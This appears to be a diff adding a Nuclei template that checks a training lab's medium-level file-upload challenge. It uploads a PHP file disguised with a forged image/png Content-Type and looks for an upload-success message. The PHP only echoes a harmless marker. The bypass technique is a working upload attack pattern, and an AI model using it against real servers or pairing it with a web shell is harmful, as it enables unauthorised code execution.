@@ -1,0 +1,33 @@
+id: vulnlab-upload-medium
+
+info:
+  name: VulnLab 文件上传 medium 档（伪造 Content-Type）
+  author: hediwen
+  severity: critical
+  tags: vulnlab,upload
+
+http:
+  - raw:
+      - |
+        POST /upload/medium.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----nucleiVulnLab
+
+        ------nucleiVulnLab
+        Content-Disposition: form-data; name="file"; filename="vulnlab_mime_bypass.php"
+        Content-Type: image/png
+
+        <?php echo "VULNLAB_UPLOAD_BYPASS_MARKER"; ?>
+        ------nucleiVulnLab--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - "上传成功"
+      - type: word
+        part: body
+        words:
+          - "vulnlab_mime_bypass.php"
